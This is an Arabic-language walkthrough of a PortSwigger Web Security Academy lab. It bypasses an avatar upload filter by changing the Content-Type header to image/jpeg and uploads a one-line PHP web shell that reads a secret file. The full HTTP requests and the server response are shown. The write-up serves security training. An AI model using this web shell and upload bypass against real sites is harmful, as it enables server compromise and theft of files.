# [Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)

## **`الهدف`**
قم برفع ملف `PHP Web Shell` بسيط واستخدمه لاستخراج محتويات ملف `/home/carlos/secret` ثم قم بتقديمه كـ `Solutiom`.
## **`خطوات الحل`**
سنقوم بتسجيل الدخول إلى حساب `wiener:peter` بعد ذلك سنقوم بعمل ملف نصي على الجهاز باستخدام أى برنامج تحرير نصوص ونضع بداخله الكود التالي ونقوم بحفظه بصيغة `php` وأى اسم عشوائي مثل `TESTTEST`:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
بعد ذلك سنقوم برفعه باستخدام خاصية رفع الـ `Avatar` داخل اللاب، ولكن سنقوم بإعتراض الطلب:
```http
POST /my-account/avatar HTTP/2
Host: 0a3600a2030c2ef88279300c006500ce.web-security-academy.net
Cookie: session=Igqra39MclLsdaqP514n4bs3ie09AmIR
Content-Length: 475
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHg0X8DemWZfLjhIP
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: https://0a3600a2030c2ef88279300c006500ce.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3600a2030c2ef88279300c006500ce.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

------WebKitFormBoundaryHg0X8DemWZfLjhIP
Content-Disposition: form-data; name="avatar"; filename="TESTTEST.php"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryHg0X8DemWZfLjhIP
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryHg0X8DemWZfLjhIP
Content-Disposition: form-data; name="csrf"

BwW56Nu8OoFhtcvRH02b6CWwQfWwXQtP
------WebKitFormBoundaryHg0X8DemWZfLjhIP--
```
وسنقوم بتعديل محتوى ترويسة `Content-Type` من `application/octet-stream` إلى `image/jpeg`
```http
POST /my-account/avatar HTTP/2
Host: 0a3600a2030c2ef88279300c006500ce.web-security-academy.net
Cookie: session=Igqra39MclLsdaqP514n4bs3ie09AmIR
Content-Length: 475
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHg0X8DemWZfLjhIP
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: https://0a3600a2030c2ef88279300c006500ce.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3600a2030c2ef88279300c006500ce.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

------WebKitFormBoundaryHg0X8DemWZfLjhIP
Content-Disposition: form-data; name="avatar"; filename="TESTTEST.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryHg0X8DemWZfLjhIP
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryHg0X8DemWZfLjhIP
Content-Disposition: form-data; name="csrf"

BwW56Nu8OoFhtcvRH02b6CWwQfWwXQtP
------WebKitFormBoundaryHg0X8DemWZfLjhIP--
```

وسنقوم بتمريره، وبمجرد اتمام الرفع وعمل تجديد لصفحة `My account` سنجد في الـ `HTTP history` الطلب التالي والذي يستدعي الملف تلقائيًا:
```http
GET /files/avatars/TESTTEST.php HTTP/2
Host: 0a3600a2030c2ef88279300c006500ce.web-security-academy.net
Cookie: session=Igqra39MclLsdaqP514n4bs3ie09AmIR
```

وبفحص الاستجابة سنجد بداخلها الـ `Secret` المطلوب
```http
HTTP/2 200 OK
Date: Mon, 28 Sep 2026 19:07:41 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 32

RQBCju7IgkbDV4cCvxPdmV0G07PXGf5z
```

بعد ذلك سنقوم بنسخه ثم نعود للصفحة الرئيسية للاب ونضغط على  `Submit solution` ونضعه في الحقل ونضغط `OK` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [Remote code execution via web shell upload](./Remote-code-execution-via-web-shell-upload.md)
